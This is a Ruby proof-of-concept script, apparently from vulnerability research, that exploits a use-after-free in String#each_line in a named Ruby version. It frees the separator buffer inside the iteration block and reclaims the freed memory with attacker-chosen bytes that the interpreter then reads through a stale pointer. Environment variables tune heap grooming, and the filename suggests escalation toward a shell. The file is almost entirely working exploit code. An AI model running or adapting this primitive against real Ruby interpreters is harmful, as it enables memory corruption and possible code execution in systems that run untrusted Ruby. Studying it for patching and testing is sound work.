# W331: chosen-byte read through the stale `String#each_line` separator
# buffer in vulnerable Ruby 3.4.12.  The block frees the original 4096-byte
# separator, then allocates a same-size string whose bytes are chosen here;
# the cached rsptr/rslen in rb_str_enumerate_lines are reused by rb_memsearch
# on the next iteration.  Plain build only: ASan traps the UAF itself.
#
# Usage: ruby ruby2shell-eachline-stale-chosen.rb
# Environment: W331C_RECLAIM=0|1 (allocate the chosen-byte string in the
# block), W331C_N (separator length), W331C_GROW (replacement length).
n = Integer(ENV.fetch('W331C_N', '4096'))
grow = Integer(ENV.fetch('W331C_GROW', '16384'))
reclaim = ENV.fetch('W331C_RECLAIM', '1') == '1'
orig = 'A' * n
chosen = 'D' * n
input = ('x' * 256) + orig + ('y' * 256) + chosen + ('z' * 256)
sep = orig.dup
calls = 0
kept = nil
begin
  lines = input.each_line(sep).map do |line|
    calls += 1
    if calls == 1
      sep.replace('B' * grow)
      Array.new(64) { 'Q' * n } if ENV['W331C_PERTURB'] == '1'
      kept = chosen.dup if reclaim # may reuse the freed separator buffer
      GC.start if ENV['W331C_GC'] == '1'
    end
    line
  end
  puts "RESULT reclaim=#{reclaim} calls=#{calls} lines=#{lines.length} " \
       "lens=#{lines.map(&:bytesize).join(',')} " \
       "chosen_tail=#{lines.last&.bytes&.last(8)&.pack('C*')&.unpack1('H*')}"
rescue => e
  puts "RESULT reclaim=#{reclaim} calls=#{calls} raised=#{e.class}: #{e.message}"
end
